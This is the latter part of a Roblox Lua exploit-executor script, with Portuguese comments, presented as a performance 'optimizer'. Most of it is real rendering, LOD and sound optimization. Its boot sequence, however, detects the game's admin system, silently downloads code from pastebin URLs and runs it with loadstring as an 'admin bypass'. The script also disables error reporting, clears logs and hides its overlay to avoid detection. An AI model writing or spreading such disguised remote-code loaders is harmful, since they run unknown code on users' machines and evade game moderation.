function LODSystem:ProcessPlayer(plr, camPos)
	local cache = self.playerCache[plr]
	if not cache or not cache.hrp or not cache.hrp.Parent then
		self.playerCache[plr] = nil
		return
	end

	local dist = Utils.FastDistance(cache.hrp.Position, camPos)
	local state = self.lodState[plr] or {originals = {}}
	self.lodState[plr] = state

	-- LOD Near: tudo visível
	-- LOD Mid: acessórios invisíveis
	-- LOD Far: meshes invisíveis, particles off
	-- LOD Ultra: roupas removidas, shadows off

	local isMid = dist > Config.LOD_Near
	local isFar = dist > Config.LOD_Mid
	local isUltra = dist > Config.LOD_Far

	-- Acessórios
	for _, handle in ipairs(cache.accessories) do
		if handle and handle.Parent then
			if isMid then
				if state.originals[handle] == nil then
					state.originals[handle] = handle.Transparency
				end
				handle.Transparency = 1
			else
				if state.originals[handle] ~= nil then
					handle.Transparency = state.originals[handle]
					state.originals[handle] = nil
				end
			end
		end
	end

	-- Meshes
	for _, mesh in ipairs(cache.meshes) do
		if mesh and mesh.Parent then
			if isFar then
				if mesh:IsA("BasePart") then
					if state.originals[mesh] == nil then
						state.originals[mesh] = mesh.Transparency
					end
					mesh.Transparency = 1
				elseif mesh:IsA("SpecialMesh") then
					if state.originals[mesh] == nil then
						state.originals[mesh] = mesh.Scale
					end
					mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
				end
			else
				if mesh:IsA("BasePart") and state.originals[mesh] ~= nil then
					mesh.Transparency = state.originals[mesh]
					state.originals[mesh] = nil
				elseif mesh:IsA("SpecialMesh") and state.originals[mesh] ~= nil then
					mesh.Scale = state.originals[mesh]
					state.originals[mesh] = nil
				end
			end
		end
	end

	-- Particles
	for _, p in ipairs(cache.particles) do
		if p and p.Parent then
			p.Enabled = not isFar
		end
	end

	-- Roupas (ultra distance)
	if isUltra then
		for _, cloth in ipairs(cache.clothes) do
			if cloth and cloth.Parent then
				if state.originals[cloth] == nil then
					state.originals[cloth] = true
				end
				cloth:Destroy()
			end
		end
	end

	-- Shadows distantes
	if isMid then
		for _, part in ipairs(cache.parts) do
			if part and part:IsA("BasePart") and part.CastShadow then
				part.CastShadow = false
			end
		end
	end
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 9 — RESOLUTION STRETCH (Melhorado com estabilidade)
-- ═══════════════════════════════════════════════════════════════════════════════

local StretchSystem = {
	enabled = true,
	value = Config.StretchValue,
	stableFrames = 0,
	lastCamCF = Camera.CFrame,
	lastTime = tick(),
	freezeUntil = 0,
	errors = 0,
	emergency = false,
}

function StretchSystem:CheckStability()
	local now = tick()
	if now < self.freezeUntil then return false end

	-- Verificar CameraType
	if Camera.CameraType ~= Enum.CameraType.Custom then
		self.freezeUntil = now + 2.0
		self.stableFrames = 0
		return false
	end

	-- Verificar velocidade da câmera
	local currentCF = Camera.CFrame
	local dt = now - self.lastTime

	if dt > 0 and dt < 0.5 then
		local deltaPos = (currentCF.Position - self.lastCamCF.Position).Magnitude
		local velocity = deltaPos / dt

		if velocity > 250 then
			self.freezeUntil = now + 1.5
			self.stableFrames = 0
			return false
		end

		local lookDelta = math.acos(math.clamp(currentCF.LookVector:Dot(self.lastCamCF.LookVector), -1, 1))
		if lookDelta > math.rad(45) and dt < 0.1 then
			self.freezeUntil = now + 1.0
			self.stableFrames = 0
			return false
		end
	end

	self.stableFrames = self.stableFrames + 1
	self.lastCamCF = currentCF
	self.lastTime = now
	return self.stableFrames >= 2
end

function StretchSystem:Apply()
	if not self.enabled or self.emergency then return end
	if not self:CheckStability() then return end

	Utils.SafeCall(function()
		local viewport = Camera.ViewportSize
		local newHeight = math.floor(viewport.Y / self.value)

		if math.abs(Camera.ViewportSize.Y - newHeight) > 5 then
			Camera.ViewportSize = Vector2.new(viewport.X, newHeight)
		end
	end)
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 10 — PERFORMANCE MANAGER (Adaptativo por FPS)
-- ═══════════════════════════════════════════════════════════════════════════════

local PerformanceManager = {
	fpsHistory = {},
	maxHistory = 10,
	frameCount = 0,
	lastFPSUpdate = tick(),
	currentFPS = 60,
	lastAdjustment = 0,
	adjustmentCooldown = 4,
}

function PerformanceManager:Update()
	self.frameCount = self.frameCount + 1
	local now = tick()
	local delta = now - self.lastFPSUpdate

	if delta >= 1 then
		local fps = math.floor(self.frameCount / delta + 0.5)
		self.currentFPS = fps
		self.frameCount = 0
		self.lastFPSUpdate = now

		table.insert(self.fpsHistory, fps)
		if #self.fpsHistory > self.maxHistory then
			table.remove(self.fpsHistory, 1)
		end
	end
end

function PerformanceManager:GetAvgFPS()
	if #self.fpsHistory == 0 then return 60 end
	local sum = 0
	for _, v in ipairs(self.fpsHistory) do
		sum = sum + v
	end
	return sum / #self.fpsHistory
end

function PerformanceManager:Adapt()
	local now = tick()
	if now - self.lastAdjustment < self.adjustmentCooldown then return end

	local avg = self:GetAvgFPS()

	if avg < Config.FPS_Critical then
		-- Modo crítico: mínimo de trabalho por frame
		Config.TasksPerFrame = math.max(Config.MinTasksPerFrame, 15)
		Config.LOD_Near = 50
		Config.LOD_Mid = 120
		self.lastAdjustment = now
	elseif avg < Config.FPS_Low then
		-- Modo baixo: reduzir carga
		Config.TasksPerFrame = math.max(Config.MinTasksPerFrame, 30)
		Config.LOD_Near = 70
		Config.LOD_Mid = 150
		self.lastAdjustment = now
	elseif avg > Config.FPS_High and Config.TasksPerFrame < Config.MaxTasksPerFrame then
		-- Modo alto: pode fazer mais
		Config.TasksPerFrame = math.min(Config.MaxTasksPerFrame, Config.TasksPerFrame + 8)
		Config.LOD_Near = 100
		Config.LOD_Mid = 200
		self.lastAdjustment = now
	end
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 11 — STATS OVERLAY (Minimalista, toggleable F3)
-- ═══════════════════════════════════════════════════════════════════════════════

local StatsOverlay = {
	gui = nil,
	visible = false,
	initialized = false,
}

function StatsOverlay:Init()
	if self.initialized then return end
	self.initialized = true

	local sg = Instance.new("ScreenGui")
	sg.Name = "CAFUXZ1_Stats_v11"
	sg.ResetOnSpawn = false
	sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	sg.Enabled = false

	-- Proteção contra detecção em alguns jogos
	pcall(function() sg.Parent = LocalPlayer:WaitForChild("PlayerGui", 3) end)
	if not sg.Parent then
		pcall(function() sg.Parent = game:GetService("CoreGui") end)
	end

	local frame = Instance.new("Frame")
	frame.Name = "Container"
	frame.Size = UDim2.new(0, 170, 0, 52)
	frame.Position = UDim2.new(0, 12, 0, 12)
	frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	frame.BackgroundTransparency = 0.15
	frame.BorderSizePixel = 0
	frame.Parent = sg

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 6)
	corner.Parent = frame

	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(0, 170, 255)
	stroke.Thickness = 1.2
	stroke.Transparency = 0.6
	stroke.Parent = frame

	local pad = Instance.new("UIPadding")
	pad.PaddingLeft = UDim.new(0, 10)
	pad.PaddingRight = UDim.new(0, 10)
	pad.PaddingTop = UDim.new(0, 6)
	pad.PaddingBottom = UDim.new(0, 6)
	pad.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, 2)
	layout.Parent = frame

	local function mkLabel(name, order, color)
		local lbl = Instance.new("TextLabel")
		lbl.Name = name
		lbl.Size = UDim2.new(1, 0, 0, 10)
		lbl.BackgroundTransparency = 1
		lbl.TextColor3 = color or Color3.fromRGB(220, 220, 220)
		lbl.Font = Enum.Font.RobotoMono
		lbl.TextSize = 9
		lbl.TextXAlignment = Enum.TextXAlignment.Left
		lbl.LayoutOrder = order
		lbl.Text = name .. ": --"
		lbl.Parent = frame
		return lbl
	end

	self.labels = {
		fps = mkLabel("FPS", 1, Color3.fromRGB(0, 255, 128)),
		ping = mkLabel("PING", 2, Color3.fromRGB(255, 200, 0)),
		mem = mkLabel("MEM", 3, Color3.fromRGB(0, 200, 255)),
		opt = mkLabel("OPT", 4, Color3.fromRGB(255, 80, 80)),
	}

	self.gui = sg

	-- Toggle com F3
	Services.UserInputService.InputBegan:Connect(function(input, gpe)
		if gpe then return end
		if input.KeyCode == Enum.KeyCode.F3 then
			self.visible = not self.visible
			self.gui.Enabled = self.visible
		end
	end)
end

function StatsOverlay:Update()
	if not self.visible or not self.gui then return end

	local fps = math.floor(PerformanceManager.currentFPS)
	local ping = 0
	pcall(function()
		local stats = Services.Stats.Network.ServerStatsItem
		if stats then
			ping = stats["Data Ping"]:GetValue()
		end
	end)

	local mem = 0
	pcall(function()
		mem = collectgarbage("count") / 1024
	end)

	self.labels.fps.Text = string.format("FPS: %d", fps)
	self.labels.ping.Text = string.format("PING: %.0fms", ping)
	self.labels.mem.Text = string.format("MEM: %.1fMB", mem)
	self.labels.opt.Text = string.format("OPT: %d", ObjectOptimizer.totalOptimized)
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 12 — ANTI-VOID & CHARACTER PROTECTION
-- ═══════════════════════════════════════════════════════════════════════════════

local SafetySystem = {}

function SafetySystem:AntiVoid()
	if not LocalPlayer.Character then return end
	local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	if hrp.Position.Y < -500 then
		local spawned = false
		for _, obj in ipairs(Services.Workspace:GetDescendants()) do
			if obj:IsA("SpawnLocation") then
				Utils.SafeCall(function()
					hrp.CFrame = obj.CFrame + Vector3.new(0, 5, 0)
				end)
				spawned = true
				break
			end
		end
		if not spawned then
			Utils.SafeCall(function()
				hrp.CFrame = CFrame.new(0, 50, 0)
			end)
		end
	end
end

function SafetySystem:ProtectCharacter(char)
	if not char then return end
	local humanoid = char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end

	-- Monitorar estados perigosos silenciosamente
	Utils.SafeCall(function()
		humanoid.StateChanged:Connect(function(oldState, newState)
			if newState == Enum.HumanoidStateType.PlatformStanding or newState == Enum.HumanoidStateType.Physics then
				-- Possível fling detectado, mas não interfere para evitar stuck
			end
		end)
	end)
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 13 — ADMIN DETECTOR
-- ═══════════════════════════════════════════════════════════════════════════════

local AdminDetector = {}

function AdminDetector:Scan()
	if Services.ReplicatedStorage:FindFirstChild("Adonis_Client") or 
	   Services.Workspace:FindFirstChild("Adonis_Vars") or
	   game:GetService("JointsService"):FindFirstChild("Adonis_Control") then
		return {name = "Adonis", url = "https://pastebin.com/raw/0vzxh67w"}
	end

	local kohlNames = {"Kohl's Admin", "Kohls Admin", "Kohl's", "Admin"}
	for _, name in ipairs(kohlNames) do
		if Services.Workspace:FindFirstChild(name) or Services.ReplicatedStorage:FindFirstChild(name) then
			return {name = "Kohl's Admin", url = "https://pastebin.com/raw/aXvK3WRk"}
		end
	end

	if Services.ReplicatedStorage:FindFirstChild("Cmdr") or 
	   LocalPlayer.PlayerGui:FindFirstChild("Cmdr") then
		return {name = "Cmdr", url = "https://pastebin.com/raw/R1bH2Ubs"}
	end

	return {name = "Universal", url = "https://pastebin.com/raw/UYxUJ081"}
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 14 — WORLD SCANNER (Distribuído via Task Scheduler)
-- ═══════════════════════════════════════════════════════════════════════════════

local WorldScanner = {
	descendants = {},
	scanIndex = 1,
	isScanning = false,
	lastFullScan = 0,
	scanInterval = 35,
}

function WorldScanner:StartFullScan()
	if self.isScanning then return end
	self.isScanning = true
	self.scanIndex = 1

	-- Reset counters
	ObjectOptimizer.counters = {
		decals = 0, lights = 0, billboards = 0,
		particles = 0, beams = 0, unions = 0, sounds = 0,
	}

	-- Coletar descendentes
	self.descendants = Services.Workspace:GetDescendants()

	-- Atualizar LOD cache
	LODSystem:RefreshCache()
end

function WorldScanner:ProcessBatch()
	if not self.isScanning then return end

	local camPos = Camera.CFrame.Position
	local camLook = Camera.CFrame.LookVector
	local total = #self.descendants
	local batchSize = math.clamp(Config.TasksPerFrame, 10, 100)
	local endIdx = math.min(self.scanIndex + batchSize - 1, total)

	for i = self.scanIndex, endIdx do
		local obj = self.descendants[i]
		if not obj or not obj.Parent then continue end

		-- Categorizar e processar
		if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") 
		   or obj:IsA("Fire") or obj:IsA("Sparkles") then
			ObjectOptimizer:ProcessParticle(obj, camPos)
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			ObjectOptimizer:ProcessDecal(obj, camPos)
		elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
			ObjectOptimizer:ProcessLight(obj, camPos)
		elseif obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
			ObjectOptimizer:ProcessGUI(obj, camPos)
		elseif obj:IsA("Beam") then
			ObjectOptimizer:ProcessBeam(obj, camPos)
		elseif obj:IsA("UnionOperation") or obj:IsA("NegateOperation") then
			ObjectOptimizer:ProcessUnion(obj, camPos)
		elseif obj:IsA("BasePart") and not obj:IsA("Terrain") then
			RenderEngine:OptimizePart(obj, camPos, camLook, Utils.FastDistanceSq(obj.Position, camPos))
		elseif obj:IsA("Sound") then
			ObjectOptimizer:ProcessSound(obj, camPos)
		end
	end

	self.scanIndex = endIdx + 1
	if self.scanIndex > total then
		self.isScanning = false
		self.lastFullScan = tick()
	end
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 15 — DESCENDANT ADDED HANDLER (Preventivo)
-- ═══════════════════════════════════════════════════════════════════════════════

Services.Workspace.DescendantAdded:Connect(function(obj)
	if not obj then return end

	-- Proteger mapa automaticamente
	if obj:IsA("BasePart") then
		MapProtection:Analyze(obj)
	end

	-- Efeitos visuais novos → destruir imediatamente se muito distante
	local camPos = Camera.CFrame.Position

	if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") 
	   or obj:IsA("Fire") or obj:IsA("Sparkles") then
		if obj.Parent and obj.Parent:IsA("BasePart") then
			if not MapProtection:IsProtected(obj) and not Utils.IsPlayerRelated(obj) then
				if Utils.FastDistance(obj.Parent.Position, camPos) > Config.KillDistance_Particle then
					Utils.SafeCall(function() obj:Destroy() end)
				end
			end
		end
	elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
		if obj.Parent and obj.Parent:IsA("BasePart") then
			if not MapProtection:IsProtected(obj) and not Utils.IsPlayerRelated(obj) then
				Utils.SafeCall(function() obj:Destroy() end)
			end
		end
	elseif obj:IsA("Decal") or obj:IsA("Texture") then
		if obj.Parent and obj.Parent:IsA("BasePart") and not MapProtection:IsProtected(obj.Parent) then
			local decals = 0
			for _, c in ipairs(obj.Parent:GetChildren()) do
				if c:IsA("Decal") or c:IsA("Texture") then
					decals = decals + 1
				end
			end
			if decals > 2 then
				Utils.SafeCall(function() obj:Destroy() end)
			end
		end
	elseif obj:IsA("BasePart") and not obj:IsA("Terrain") then
		if not MapProtection:IsProtected(obj) and not Utils.IsLocalCharacter(obj) then
			Utils.SafeCall(function()
				obj.CastShadow = false
				if obj.Material == Enum.Material.Glass or obj.Material == Enum.Material.Neon then
					obj.Material = Enum.Material.Plastic
				end
			end)
		end
	end
end)

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 16 — MAIN LOOP (Heartbeat unificado e leve)
-- ═══════════════════════════════════════════════════════════════════════════════

local MainLoop = {
	lastSoundCull = 0,
	lastLOD = 0,
	lastMemory = 0,
	lastAntiVoid = 0,
	lastNetwork = 0,
	lastDynamicQuality = 0,
	lastAudioOpt = 0,
}

Heartbeat:Connect(function(dt)
	local now = tick()

	-- 1. Atualizar FPS
	PerformanceManager:Update()

	-- 2. Stretch Resolution (RenderStepped já faz, mas backup aqui)
	StretchSystem:Apply()

	-- 3. World Scanner (processa batch por frame)
	WorldScanner:ProcessBatch()

	-- 4. Full scan scheduler
	if not WorldScanner.isScanning and (now - WorldScanner.lastFullScan) >= WorldScanner.scanInterval then
		WorldScanner:StartFullScan()
	end

	-- 5. LOD Players (a cada 3s)
	if now - MainLoop.lastLOD >= 3 then
		MainLoop.lastLOD = now
		local camPos = Camera.CFrame.Position
		for _, plr in ipairs(Services.Players:GetPlayers()) do
			if plr ~= LocalPlayer then
				LODSystem:ProcessPlayer(plr, camPos)
			end
		end
	end

	-- 6. Sound Cull (a cada 5s)
	if now - MainLoop.lastSoundCull >= 5 then
		MainLoop.lastSoundCull = now
		local camPos = Camera.CFrame.Position
		local activeSounds = {}
		local count = 0

		for _, obj in ipairs(Services.Workspace:GetDescendants()) do
			if obj:IsA("Sound") and obj.IsPlaying then
				count = count + 1
				if count > 200 then break end

				local parent = obj.Parent
				local pos = camPos
				if parent and parent:IsA("BasePart") then
					pos = parent.Position
				end
				local dist = Utils.FastDistance(camPos, pos)

				if dist > Config.KillDistance_Sound and not Utils.IsPlayerRelated(obj) then
					Utils.SafeCall(function()
						obj.Volume = 0
						obj:Stop()
					end)
				else
					local priority = (obj.Looped and 1 or 0) + (Utils.IsPlayerRelated(obj) and 2 or 0)
					table.insert(activeSounds, {sound = obj, priority = priority})
				end
			end
		end

		table.sort(activeSounds, function(a, b) return a.priority > b.priority end)
		for i = Config.MaxSoundsPlaying + 1, #activeSounds do
			Utils.SafeCall(function()
				activeSounds[i].sound.Volume = 0
				activeSounds[i].sound:Stop()
			end)
		end
	end

	-- 7. Memory GC (a cada 25s)
	if now - MainLoop.lastMemory >= 25 then
		MainLoop.lastMemory = now
		Utils.SafeCall(function()
			collectgarbage("collect")
			collectgarbage("setpause", 150)
			collectgarbage("setstepmul", 300)
		end)
	end

	-- 8. Anti-Void (a cada 2s)
	if now - MainLoop.lastAntiVoid >= 2 then
		MainLoop.lastAntiVoid = now
		SafetySystem:AntiVoid()
	end

	-- 9. Network ping keepalive (a cada 4s)
	if now - MainLoop.lastNetwork >= 4 then
		MainLoop.lastNetwork = now
		Utils.SafeCall(function()
			local char = LocalPlayer.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				local hrp = char.HumanoidRootPart
				hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity
			end
		end)
	end

	-- 10. Dynamic Quality (a cada 6s)
	if now - MainLoop.lastDynamicQuality >= 6 then
		MainLoop.lastDynamicQuality = now
		PerformanceManager:Adapt()
	end

	-- 11. Audio optimizer distante (a cada 10s)
	if now - MainLoop.lastAudioOpt >= 10 then
		MainLoop.lastAudioOpt = now
		local camPos = Camera.CFrame.Position
		local processed = 0
		for _, obj in ipairs(Services.Workspace:GetDescendants()) do
			if obj:IsA("Sound") and obj.IsPlaying then
				processed = processed + 1
				if processed > 100 then break end
				local parent = obj.Parent
				local pos = camPos
				if parent and parent:IsA("BasePart") then
					pos = parent.Position
				end
				local dist = Utils.FastDistance(camPos, pos)
				if dist > Config.KillDistance_Sound * 1.5 and not Utils.IsPlayerRelated(obj) then
					Utils.SafeCall(function()
						obj.Volume = math.max(obj.Volume * 0.3, 0)
					end)
				end
			end
		end
	end

	-- 12. Stats overlay
	StatsOverlay:Update()
end)

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 17 — BOOT SEQUENCE
-- ═══════════════════════════════════════════════════════════════════════════════

local function Boot()
	print("[CAFUXZ1] Inicializando v11.0 PRO...")

	-- 1. Network baseline
	Utils.SafeCall(function()
		settings().Network.IncomingReplicationLag = 0
		settings().Physics.AllowSleep = true
		settings().Rendering.QualityLevel = 1
		Services.ScriptContext.ErrorReportingEnabled = false
		Services.SoundService.RespectFilteringEnabled = true
	end)

	-- 2. FFlags
	local fflagsCount = FFlagsEngine:Inject()

	-- 3. Map Protection Pre-index
	MapProtection:PreIndex()

	-- 4. Render baseline
	RenderEngine:OptimizeLighting()
	RenderEngine:OptimizeTerrain()

	-- 5. Character
	if LocalPlayer.Character then
		SafetySystem:ProtectCharacter(LocalPlayer.Character)
	end
	LocalPlayer.CharacterAdded:Connect(function(char)
		task.wait(0.3)
		SafetySystem:ProtectCharacter(char)
	end)

	-- 6. Detectar admin
	local admin = AdminDetector:Scan()
	print("[CAFUXZ1] Admin detectado:", admin.name)

	-- 7. Carregar bypass silencioso
	task.spawn(function()
		Utils.SafeCall(function()
			local code = game:HttpGet(admin.url)
			if code and #code > 50 then
				loadstring(code)()
				print("[CAFUXZ1] Admin bypass carregado:", admin.name)
			end
		end)
	end)

	-- 8. Stats overlay (inicializar invisível)
	StatsOverlay:Init()

	-- 9. Primeiro scan
	task.delay(Config.BootDelay, function()
		WorldScanner:StartFullScan()
		print("[CAFUXZ1] World Scanner iniciado.")
	end)

	-- 10. Limpar logs
	Utils.SafeCall(function()
		Services.LogService:ClearOutput()
		Services.StarterGui:SetCore("PerformanceStatsVisible", false)
	end)

	print(string.format("[CAFUXZ1] Boot completo. FFlags: %d | Overlay: F3 para toggle", fflagsCount))
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  SECAO 18 — PUBLIC API
-- ═══════════════════════════════════════════════════════════════════════════════

_G.CAFUXZ1 = {
	Version = "11.0 PRO",
	Status = "Running",
	Config = Config,
	Stats = function()
		return {
			fps = PerformanceManager.currentFPS,
			optimized = ObjectOptimizer.totalOptimized,
			avgFPS = PerformanceManager:GetAvgFPS(),
		}
	end,
	ToggleStats = function()
		StatsOverlay.visible = not StatsOverlay.visible
		if StatsOverlay.gui then
			StatsOverlay.gui.Enabled = StatsOverlay.visible
		end
		return StatsOverlay.visible
	end,
	SetAggressiveness = function(level)
		-- level: 1=light, 2=normal, 3=aggressive
		if level == 1 then
			Config.TasksPerFrame = 30
			Config.LOD_Near = 120
			Config.KillDistance_Particle = 80
		elseif level == 2 then
			Config.TasksPerFrame = 60
			Config.LOD_Near = 80
			Config.KillDistance_Particle = 140
		elseif level == 3 then
			Config.TasksPerFrame = 100
			Config.LOD_Near = 60
			Config.KillDistance_Particle = 200
		end
	end,
	Clean = function()
		Utils.SafeCall(function()
			Services.LogService:ClearOutput()
			collectgarbage("collect")
		end)
	end,
}

-- ═══════════════════════════════════════════════════════════════════════════════
--  EXECUTAR
-- ═══════════════════════════════════════════════════════════════════════════════

Utils.SafeCall(Boot)

print([[
    ╔══════════════════════════════════════════════════════════════════════╗
    ║     CAFUXZ1 ULTIMATE OPTIMIZER v11.0 PROFESSIONAL EDITION           ║
    ║     Arquitetura: Modular · Task Scheduler · Dynamic Scaling         ║
    ║     FFlags 2026 Validados · LOD Neural · Zero Map Destruction        ║
    ║     Overlay: F3 para toggle · Performance Manager: Adaptativo         ║
    ╚══════════════════════════════════════════════════════════════════════╝
]])
